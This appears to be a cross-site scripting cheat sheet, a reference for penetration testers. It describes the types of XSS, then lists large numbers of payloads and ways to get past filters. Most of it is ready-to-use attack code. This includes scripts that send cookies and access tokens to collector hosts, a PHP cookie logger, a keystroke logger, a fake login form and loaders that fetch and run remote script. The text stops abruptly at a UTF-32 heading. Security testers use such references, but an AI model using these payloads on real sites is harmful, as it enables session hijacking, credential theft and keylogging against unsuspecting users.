# Cross Site Scripting

> Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.

## Methodology

Cross-Site Scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS allows attackers to inject malicious code into a website, which is then executed in the browser of anyone who visits the site. This can allow attackers to steal sensitive information, such as user login credentials, or to perform other malicious actions.

There are 3 main types of XSS attacks:

- **Reflected XSS**: In a reflected XSS attack, the malicious code is embedded in a link that is sent to the victim. When the victim clicks on the link, the code is executed in their browser. For example, an attacker could create a link that contains malicious JavaScript, and send it to the victim in an email. When the victim clicks on the link, the JavaScript code is executed in their browser, allowing the attacker to perform various actions, such as stealing their login credentials.

- **Stored XSS**: In a stored XSS attack, the malicious code is stored on the server, and is executed every time the vulnerable page is accessed. For example, an attacker could inject malicious code into a comment on a blog post. When other users view the blog post, the malicious code is executed in their browsers, allowing the attacker to perform various actions.

- **DOM-based XSS**: is a type of XSS attack that occurs when a vulnerable web application modifies the DOM (Document Object Model) in the user's browser. This can happen, for example, when a user input is used to update the page's HTML or JavaScript code in some way. In a DOM-based XSS attack, the malicious code is not sent to the server, but is instead executed directly in the user's browser. This can make it difficult to detect and prevent these types of attacks, because the server does not have any record of the malicious code.

To prevent XSS attacks, it is important to properly validate and sanitize user input. This means ensuring that all input meets the necessary criteria, and removing any potentially dangerous characters or code. It is also important to escape special characters in user input before rendering it in the browser, to prevent the browser from interpreting it as code.

## Proof of Concept

When exploiting an XSS vulnerability, it’s more effective to demonstrate a complete exploitation scenario that could lead to account takeover or sensitive data exfiltration. Instead of simply reporting an XSS with an alert payload, aim to capture valuable data, such as payment information, personal identifiable information (PII), session cookies, or credentials.

### Data Grabber

Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.

```html
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
```

Write the collected data into a file.

```php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

### CORS

```html
<script>
  fetch('https://<SESSION>.burpcollaborator.net', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```

### UI Redressing

Leverage the XSS to modify the HTML content of the page in order to display a fake login form.

```html
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
</script>
```

### Javascript Keylogger

Another way to collect sensitive data is to set a javascript keylogger.

```javascript
<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
```

### Other Ways

More exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all):

- [Taking screenshots using XSS and the HTML5 Canvas](https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/)
- [JavaScript Port Scanner](http://www.gnucitizen.org/blog/javascript-port-scanner/)
- [Network Scanner](http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html)
- [.NET Shell execution](http://www.xss-payloads.com/payloads/scripts/dotnetexec.js.html)
- [Redirect Form](http://www.xss-payloads.com/payloads/scripts/redirectform.js.html)
- [Play Music](http://www.xss-payloads.com/payloads/scripts/playmusic.js.html)

## Identify an XSS Endpoint

This payload opens the debugger in the developer console rather than triggering a popup alert box.

```javascript
<script>debugger;</script>
```

Modern applications with content hosting can use [sandbox domains][sandbox-domains]

> to safely host various types of user-generated content. Many of these sandboxes are specifically meant to isolate user-uploaded HTML, JavaScript, or Flash applets and make sure that they can't access any user data.

[sandbox-domains]:https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html

For this reason, it's better to use `alert(document.domain)` or `alert(window.origin)` rather than `alert(1)` as default XSS payload in order to know in which scope the XSS is actually executing.

Better payload replacing `<script>alert(1)</script>`:

```html
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
```

While `alert()` is nice for reflected XSS it can quickly become a burden for stored XSS because it requires to close the popup for each execution, so `console.log()` can be used instead to display a message in the console of the developer console (doesn't require any interaction).

Example:

```html
<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
```

References:

- [Google Bughunter University - XSS in sandbox domains](https://sites.google.com/site/bughunteruniversity/nonvuln/xss-in-sandbox-domain)
- [LiveOverflow Video - DO NOT USE alert(1) for XSS](https://www.youtube.com/watch?v=KHwVjzWei1c)
- [LiveOverflow blog post - DO NOT USE alert(1) for XSS](https://liveoverflow.com/do-not-use-alert-1-in-xss/)

### Tools

Most tools are also suitable for blind XSS attacks:

- [XSSStrike](https://github.com/s0md3v/XSStrike): Very popular but unfortunately not very well maintained
- [xsser](https://github.com/epsylon/xsser): Utilizes a headless browser to detect XSS vulnerabilities
- [Dalfox](https://github.com/hahwul/dalfox): Extensive functionality and extremely fast thanks to the implementation in Go
- [XSpear](https://github.com/hahwul/XSpear): Similar to Dalfox but based on Ruby
- [domdig](https://github.com/fcavallarin/domdig): Headless Chrome XSS Tester

## XSS in HTML/Applications

### Common Payloads

```javascript
// Basic payload
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">

// Img payload
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
<><img src=1 onerror=alert(1)>

// Svg payload
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;

// Div payload
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```

### XSS using HTML5 tags

```javascript
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

<body ontouchstart=alert(1)> // Triggers when a finger touch the screen
<body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen
<body ontouchmove=alert(1)>  // When a finger is dragged across the screen.
```

### XSS using a remote JS

```html
<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
<script src=14.rs>
// you can also specify an arbitrary payload with 14.rs/#payload
e.g: 14.rs/#alert(document.domain)
```

### XSS in Hidden Input

```javascript
<input type="hidden" accesskey="X" onclick="alert(1)">
Use CTRL+SHIFT+X to trigger the onclick event
```

in newer browsers : firefox-130/chrome-108

```javascript
<input type="hidden" oncontentvisibilityautostatechange="alert(1)"  style="content-visibility:auto" >
```

### XSS in Uppercase Output

```javascript
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
```

### DOM Based XSS

Based on a DOM XSS sink.

```javascript
#"><img src=/ onerror=alert(2)>
```

### XSS in JS Context

```javascript
-(confirm)(document.domain)//
; alert(1);//
// (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)
```

## XSS in Wrappers for URI

### Wrapper javascript

```javascript
javascript:prompt(1)

%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341

&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41

We can encode the "javascript:" in Hex/Octal
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
\152\141\166\141\163\143\162\151\160\164\072alert(1)

We can use a 'newline character'
java%0ascript:alert(1)   - LF (\n)
java%09script:alert(1)   - Horizontal tab (\t)
java%0dscript:alert(1)   - CR (\r)

Using the escape character
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)

Using the newline and a comment //
javascript://%0Aalert(1)
javascript://anything%0D%0A%0D%0Awindow.alert(1)
```

### Wrapper data

```javascript
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

### Wrapper vbscript

only IE

```javascript
vbscript:msgbox("XSS")
```

## XSS in Files

**NOTE:** The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.

```xml
<name>
  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
</name>
```

### XSS in XML

```xml
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>
```

### XSS in SVG

Simple script. Codename: green triangle

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

More comprehensive payload with svg tag attribute, desc script, foreignObject script, foreignObject iframe, title script, animatetransform event and simple script. Codename: red ligthning. Author: noraj.

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" width="100" height="100" xmlns="http://www.w3.org/2000/svg" onload="alert('svg attribut')">
  <polygon id="lightning" points="0,100 50,25 50,75 100,0" fill="#ff1919" stroke="#ff0000"/>
  <desc><script>alert('svg desc')</script></desc>
  <foreignObject><script>alert('svg foreignObject')</script></foreignObject>
  <foreignObject width="500" height="500">
    <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert('svg foreignObject iframe');" width="400" height="250"/>
  </foreignObject>
  <title><script>alert('svg title')</script></title>
  <animatetransform onbegin="alert('svg animatetransform onbegin')"></animatetransform>
  <script type="text/javascript">
    alert('svg script');
  </script>
</svg>
```

#### Short SVG Payload

```javascript
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```

### Nesting SVG and XSS

Including a remote SVG image in a SVG works but won't trigger the XSS embedded in the remote SVG. Author: noraj.

SVG 1.x (xlink:href)

```xml
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://127.0.0.1:9999/red_lightning_xss_full.svg" height="200" width="200"/>
</svg>
```

Including a remote SVG fragment in a SVG works but won't trigger the XSS embedded in the remote SVG element because it's impossible to add vulnerable attribute on a polygon/rect/etc since the `style` attribute is no longer a vector on modern browsers. Author: noraj.

SVG 1.x (xlink:href)

```xml
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <use xlink:href="http://127.0.0.1:9999/red_lightning_xss_full.svg#lightning"/>
</svg>
```

However, including svg tags in SVG documents works and allows XSS execution from sub-SVGs. Codename: french flag. Author: noraj.

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <svg x="10">
    <rect x="10" y="10" height="100" width="100" style="fill: #002654"/>
    <script type="text/javascript">alert('sub-svg 1');</script>
  </svg>
  <svg x="200">
    <rect x="10" y="10" height="100" width="100" style="fill: #ED2939"/>
    <script type="text/javascript">alert('sub-svg 2');</script>
  </svg>
</svg>
```

### XSS in Markdown

```csharp
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
```

### XSS in CSS

```html
<!DOCTYPE html>
<html>
<head>
<style>
div  {
    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
    background-color: #cccccc;
}
</style>
</head>
  <body>
    <div>lol</div>
  </body>
</html>
```

## XSS in PostMessage

> If the target origin is asterisk * the message can be sent to any domain has reference to the child page.

```html
<html>
<body>
    <input type=button value="Click Me" id="btn">
</body>

<script>
document.getElementById('btn').onclick = function(e){
    window.poc = window.open('http://www.redacted.com/#login');
    setTimeout(function(){
        window.poc.postMessage(
            {
                "sender": "accounts",
                "url": "javascript:confirm('XSS')",
            },
            '*'
        );
    }, 2000);
}
</script>
</html>
```

## Blind XSS

### XSS Hunter

> XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.

XSS Hunter is deprecated, it was available at [https://xsshunter.com/app](https://xsshunter.com/app).

You can set up an alternative version

- Self-hosted version from [mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)
- Hosted on [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com/)

```xml
"><script src="https://js.rip/<custom.name>"></script>
"><script src=//<custom.subdomain>.xss.ht></script>
<script>$.getScript("//<custom.subdomain>.xss.ht")</script>
```

### Other Blind XSS tools

- [Netflix-Skunkworks/sleepy-puppy](https://github.com/Netflix-Skunkworks/sleepy-puppy) - Sleepy Puppy XSS Payload Management Framework
- [LewisArdern/bXSS](https://github.com/LewisArdern/bXSS) - bXSS is a utility which can be used by bug hunters and organizations to identify Blind Cross-Site Scripting.
- [ssl/ezXSS](https://github.com/ssl/ezXSS) - ezXSS is an easy way for penetration testers and bug bounty hunters to test (blind) Cross Site Scripting.

### Blind XSS endpoint

- Contact forms
- Ticket support
- Referer Header
    - Custom Site Analytics
    - Administrative Panel logs
- User Agent
    - Custom Site Analytics
    - Administrative Panel logs
- Comment Box
    - Administrative Panel

### Tips

You can use a [data grabber for XSS](#data-grabber) and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind-XSS testing tool.

Eg. payload

```html
<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>
```

Eg. one-line HTTP server:

```ps1
ruby -run -ehttpd . -p8080
```

## Mutated XSS

Use browsers quirks to recreate some HTML tags.

**Example**: Mutated XSS from Masato Kinugawa, used against [cure53/DOMPurify](https://github.com/cure53/DOMPurify) component on Google Search.

```javascript
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```


---

# XSS Filter Bypass

## Bypass Case Sensitive

To bypass a case-sensitive XSS filter, you can try mixing uppercase and lowercase letters within the tags or function names.

```javascript
<sCrIpt>alert(1)</ScRipt>
<ScrIPt>alert(1)</ScRipT>
```

Since many XSS filters only recognize exact lowercase or uppercase patterns, this can sometimes evade detection by tricking simple case-sensitive filters.

## Bypass Tag Blacklist

```javascript
<script x>
<script x>alert('XSS')<script y>
```

## Bypass Word Blacklist with Code Evaluation

```javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
```

## Bypass with Incomplete HTML Tag

Works on IE/Firefox/Chrome/Safari

```javascript
<img src='1' onerror='alert(0)' <
```

## Bypass Quotes for String

```javascript
String.fromCharCode(88,83,83)
```

## Bypass Quotes in Script Tag

```javascript
http://localhost/bla.php?test=</script><script>alert(1)</script>
<html>
  <script>
    <?php echo 'foo="text '.$_GET['test'].'";';`?>
  </script>
</html>
```

## Bypass Quotes in Mousedown Event

You can bypass a single quote with &#39; in an on mousedown event handler

```javascript
<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
```

## Bypass Dot Filter

```javascript
<script>window['alert'](document['domain'])</script>
```

Convert IP address into decimal format: IE. `http://192.168.1.1` == `http://3232235777`

```javascript
<script>eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))<script>
```

Base64 encoding your XSS payload with Linux command: IE. `echo -n "alert(document.cookie)" | base64` == `YWxlcnQoZG9jdW1lbnQuY29va2llKQ==`

## Bypass Parenthesis for String

```javascript
alert`1`
setTimeout`alert\u0028document.domain\u0029`;
```

## Bypass Parenthesis and Semi Colon

- From @garethheyes

    ```javascript
    <script>onerror=alert;throw 1337</script>
    <script>{onerror=alert}throw 1337</script>
    <script>throw onerror=alert,'some string',123,'haha'</script>
    ```

- From @terjanq

    ```js
    <script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
    ```

- From @cgvwzq

    ```js
    <script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
    ```

## Bypass onxxxx Blacklist

- Use less known tag

    ```html
    <object onafterscriptexecute=confirm(0)>
    <object onbeforescriptexecute=confirm(0)>
    ```

- Bypass onxxx= filter with a null byte/vertical tab/Carriage Return/Line Feed

    ```html
    <img src='1' onerror\x00=alert(0) />
    <img src='1' onerror\x0b=alert(0) />
    <img src='1' onerror\x0d=alert(0) />
    <img src='1' onerror\x0a=alert(0) />
    ```

- Bypass onxxx= filter with a '/'

    ```js
    <img src='1' onerror/=alert(0) />
    ```

## Bypass Space Filter

- Bypass space filter with "/"

    ```javascript
    <img/src='1'/onerror=alert(0)>
    ```

- Bypass space filter with `0x0c/^L` or `0x0d/^M` or `0x0a/^J` or `0x09/^I`

  ```html
  <svgonload=alert(1)>
  ```

```ps1
$ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  <svg.onload.=.al
00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
```

## Bypass Email Filter

- [RFC0822 compliant](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate)

  ```javascript
  "><svg/onload=confirm(1)>"@x.y
  ```

- [RFC5322 compliant](https://0dave.ch/posts/rfc5322-fun/)

  ```javascript
  xss@example.com(<img src='x' onerror='alert(document.location)'>)
  ```

## Bypass Tel URI Filter

At least 2 RFC mention the `;phone-context=` descriptor:

- [RFC3966 - The tel URI for Telephone Numbers](https://www.ietf.org/rfc/rfc3966.txt)
- [RFC2806 - URLs for Telephone Calls](https://www.ietf.org/rfc/rfc2806.txt)

```javascript
+330011223344;phone-context=<script>alert(0)</script>
```

## Bypass Document Blacklist

```javascript
<div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
window["doc"+"ument"]
```

## Bypass document.cookie Blacklist

This is another way to access cookies on Chrome, Edge, and Opera. Replace COOKIE NAME with the cookie you are after. You may also investigate the getAll() method if that suits your requirements.

```js
window.cookieStore.get('COOKIE NAME').then((cookieValue)=>{alert(cookieValue.value);});
```

## Bypass using Javascript Inside a String

```javascript
<script>
foo="text </script><script>alert(1)</script>";
</script>
```

## Bypass using an Alternate Way to Redirect

```javascript
location="http://google.com"
document.location = "http://google.com"
document.location.href="http://google.com"
window.location.assign("http://google.com")
window['location']['href']="http://google.com"
```

## Bypass using an Alternate Way to Execute an Alert

From [@brutelogic](https://twitter.com/brutelogic/status/965642032424407040) tweet.

```javascript
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)

[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
```

From [@theMiddle](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/) - Using global variables

The Object.keys() method returns an array of a given object's own property names, in the same order as we get with a normal loop. That's means that we can access any JavaScript function by using its **index number instead the function name**.

```javascript
c=0; for(i in self) { if(i == "alert") { console.log(c); } c++; }
// 5
```

Then calling alert is :

```javascript
Object.keys(self)[5]
// "alert"
self[Object.keys(self)[5]]("1") // alert("1")
```

We can find "alert" with a regular expression like ^a[rel]+t$ :

```javascript
//bind function alert on new function a()
a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} 

// then you can use a() with Object.keys
self[Object.keys(self)[a()]]("1") // alert("1")
```

Oneliner:

```javascript
a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]]("1")
```

From [@quanyang](https://twitter.com/quanyang/status/1078536601184030721) tweet.

```javascript
prompt`${document.domain}`
document.location='java\tscript:alert(1)'
document.location='java\rscript:alert(1)'
document.location='java\tscript:alert(1)'
```

From [@404death](https://twitter.com/404death/status/1011860096685502464) tweet.

```javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;

constructor.constructor("aler"+"t(3)")();
[].filter.constructor('ale'+'rt(4)')();

top["al"+"ert"](5);
top[8680439..toString(30)](7);
top[/al/.source+/ert/.source](8);
top['al\x65rt'](9);

open('java'+'script:ale'+'rt(11)');
location='javascript:ale'+'rt(12)';

setTimeout`alert\u0028document.domain\u0029`;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
```

Bypass using an alternate way to trigger an alert

```javascript
var i = document.createElement("iframe");
i.onload = function(){
  i.contentWindow.alert(1);
}
document.appendChild(i);

// Bypassed security
XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
      var proxy = obj[name];
      obj[name] = function () {
        if (exec_original) {
          return proxy.apply(this, arguments);
        }
      };
      XSSObject.lockdown(obj, name);
  };
XSSObject.proxy(window, 'alert', 'window.alert', false);
```

## Bypass ">" using Nothing

There is no need to close the tags, the browser will try to fix it.

```javascript
<svg onload=alert(1)//
```

## Bypass "<" and ">" using ＜ and ＞

Use Unicode characters `U+FF1C` and `U+FF1E`, refer to [Bypass using Unicode](#bypass-using-unicode) for more.

```javascript
＜script/src=//evil.site/poc.js＞
```

## Bypass ";" using Another Character

```javascript
'te' * alert('*') * 'xt';
'te' / alert('/') / 'xt';
'te' % alert('%') % 'xt';
'te' - alert('-') - 'xt';
'te' + alert('+') + 'xt';
'te' ^ alert('^') ^ 'xt';
'te' > alert('>') > 'xt';
'te' < alert('<') < 'xt';
'te' == alert('==') == 'xt';
'te' & alert('&') & 'xt';
'te' , alert(',') , 'xt';
'te' | alert('|') | 'xt';
'te' ? alert('ifelsesh') : 'xt';
'te' in alert('in') in 'xt';
'te' instanceof alert('instanceof') instanceof 'xt';
```

## Bypass using Missing Charset Header

**Requirements**:

- Server header missing `charset`: `Content-Type: text/html`

### ISO-2022-JP

ISO-2022-JP uses escape characters to switch between several character sets.

| Escape    | Encoding        |
|-----------|-----------------|
| `\x1B (B` | ASCII           |
| `\x1B (J` | JIS X 0201 1976 |
| `\x1B $@` | JIS X 0208 1978 |
| `\x1B $B` | JIS X 0208 1983 |

Using the [code table](https://en.wikipedia.org/wiki/JIS_X_0201#Codepage_layout), we can find multiple characters that will be transformed when switching from **ASCII** to **JIS X 0201 1976**.

| Hex  | ASCII | JIS X 0201 1976 |
| ---- | --- | --- |
| 0x5c | `\` | `¥` |
| 0x7e | `~` | `‾` |

**Example**:

Use `%1b(J` to force convert a `\'` (ascii) in to `¥'` (JIS X 0201 1976), unescaping the quote.

Payload: `search=%1b(J&lang=en";alert(1)//`

## Bypass using HTML Encoding

```javascript
%26%2397;lert(1)
&#97;&#108;&#101;&#114;&#116;
></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
```

## Bypass using Katakana

Using the [aemkei/Katakana](https://github.com/aemkei/katakana.js) library.

```javascript
javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
```

## Bypass using Cuneiform

```javascript
𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
```

## Bypass using Lontara

```javascript
ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()
```

More alphabets on [aem1k.com/aurebesh.js](http://aem1k.com/aurebesh.js/)

## Bypass using ECMAScript6

```html
<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>
```

## Bypass using Octal encoding

```javascript
javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'
```

## Bypass using Unicode

This payload takes advantage of Unicode escape sequences to obscure the JavaScript function

```html
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
```

It uses Unicode escape sequences to represent characters.

| Unicode  | ASCII     |
| -------- | --------- |
| `\u0061` | a         |
| `\u006C` | l         |
| `\u0065` | e         |
| `\u0072` | r         |
| `\u0074` | t         |

Same thing with these Unicode characters.

| Unicode (UTF-8 encoded) | Unicode Name                 | ASCII | ASCII Name     |
| ----------------------- | ---------------------------- | ----- | ---------------|
| `\uFF1C` (%EF%BC%9C)    | FULLWIDTH LESS­THAN SIGN      | <     | LESS­THAN       |
| `\uFF1E` (%EF%BC%9E)    | FULLWIDTH GREATER­THAN SIGN   | >     | GREATER­THAN    |
| `\u02BA` (%CA%BA)       | MODIFIER LETTER DOUBLE PRIME | "     | QUOTATION MARK |
| `\u02B9` (%CA%B9)       | MODIFIER LETTER PRIME        | '     | APOSTROPHE     |

An example payload could be `ʺ＞＜svg onload=alert(/XSS/)＞/`, which would look like that after being URL encoded:

```javascript
%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/
```

When Unicode characters are converted to another case, they might bypass a filter look for specific keywords.

| Unicode  | Transform | Character |
| -------- | --------- | --------- |
| `İ` (%c4%b0) | `toLowerCase()` | i |
| `ı` (%c4%b1) | `toUpperCase()` | I |
| `ſ` (%c5%bf) | `toUpperCase()` | S |
| `K` (%E2%84) | `toLowerCase()` | k |

The following payloads become valid HTML tags after being converted.

```html
<ſvg onload=... >
<ıframe id=x onload=>
```

## Bypass using UTF-7

```javascript
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
```

## Bypass using UTF-8

```javascript
< = %C0%BC = %E0%80%BC = %F0%80%80%BC
> = %C0%BE = %E0%80%BE = %F0%80%80%BE
' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
" = %CA%BA
' = %CA%B9
```

## Bypass using UTF-16be

```javascript
%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00
\x00<\x00s\x00v\x00g\x00/\x00o\x00n\x00l\x00o\x00a\x00d\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x00)\x00>
```

## Bypass using UTF-32

```js
